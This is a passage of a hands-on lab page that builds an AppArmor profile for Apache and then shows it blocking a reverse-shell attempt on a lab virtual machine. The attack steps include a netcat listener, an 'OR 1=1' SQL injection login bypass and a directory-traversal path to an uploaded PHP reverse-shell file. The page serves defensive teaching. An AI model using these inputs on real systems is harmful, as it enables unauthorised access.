+<p>You may be asked about one or two image directories, called<code>/var/www/images/</code> and <code>/var/www/uploaded_images</code>. Clearly, we’ll need to let Apache read all the images in those directories.  We could make a set of custom rules, allowing Apache to only read image files with specific extensions we expect to use, but that risks making a rule that’s too tight to work over time.</p>
+</li>
+<li>
+<p>Using G to glob requests to <code>/var/www/images/*</code> and <code>/var/www/uploaded_images/*</code> or use <code>N</code> to create a rule that covers both, like:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/{,uploaded_}images/*
+</code></pre></div></div>
+</li>
+<li>
+<p>For globbing, here's an example: Apache needs to read <code>/var/www/uploaded_images/CaptBarbossa.JPG</code>, so <code>hit G</code> to glob this to <code>/var/www/uploaded_images/*</code>, then <code>hit A</code> to allow.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>/var/www/uploaded_images/ANY-IMAGE.JPG</code></strong></p>
+<ul>
+<li>We get this question about another image in <code>/var/www/uploaded_images</code>, so just <code>hit A</code> to allow.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Eventually, <code>aa-genprof</code> says &quot;The following local profiles were changed. Would you like to save them?&quot; Hit <code>S</code> to save, then hit <code>F</code> to finish and begin enforcing this profile.</p>
+</li>
+<li>
+<p>Run <code>aa-status</code> to see that <code>apache2</code> is now being contained by AppArmor.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aa-status
+</code></pre></div></div>
+</li>
+<li>
+<p>Start the apache server back up:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/init.d/apache2 start
+</code></pre></div></div>
+</li>
+<li>
+<p>Keep a terminal window alive that contains the SSH session to the billubox virtual machine.</p>
+</li>
+<li>
+<p>Start a new terminal window/tab on your Kali machine.</p>
+</li>
+<li>
+<p>Start up the netcat listener on your Kali machine:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4444
+</code></pre></div></div>
+</li>
+<li>
+<p>Now browse to billubox from the Kali system's browser.  First, bypass the login page using the SQL injection attack, by setting both the username and password to:  <code>OR 1=1 -- \</code></p>
+</li>
+<li>
+<p>Now, put the attack form in your browser URL bar: <a href="file:///root/Billubox-Exercise/panel-form.html">file:///root/Billubox-Exercise/panel-form.html</a></p>
+</li>
+<li>
+<p>Put this into the text input area and click the continue button.</p>
+<pre><code>../../../../../../../var/www/uploaded_images/php-reverse.gif
+</code></pre></li>
+<li>
+<p>You shouldn't get a shell.  Instead, the web page will show an error like this, &quot;GIF89 WARNING: Failed to daemonise. This is quite common and not fatal...&quot;</p>
+</li>
+<li>
+<p>In the billubox SSH session, run a tail command on <code>/var/log/kern.log</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail</span> /var/log/kern.log
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the very last line will be something like this:</p>
+<pre><code>Jul 20 03:57:58 indishell kernel: [ 7963.186892] type=1400 audit(1532730478.867:1077): apparmor=&quot;DENIED&quot; operation=&quot;exec&quot; profile=&quot;/usr/lib/apache2/mpm-itk/apache2&quot; name=&quot;/bin/dash&quot; pid=7508 comm=&quot;apache2&quot; requested_mask=&quot;x&quot; denied_mask=&quot;x&quot; fsuid=33 ouid=0
+</code></pre>
+<p>This means that AppArmor stopped the <code>apache2</code> program from running a shell via the <code>/bin/dash</code> command.</p>
+</li>
+<li>
+<p>Close all the terminal windows you started for this exercise.</p>
+</li>
+<li>
+<p>Start a new terminal and suspend the virtual machines:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /sync/bin/suspend-all-vms.sh 
+</code></pre></div></div>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
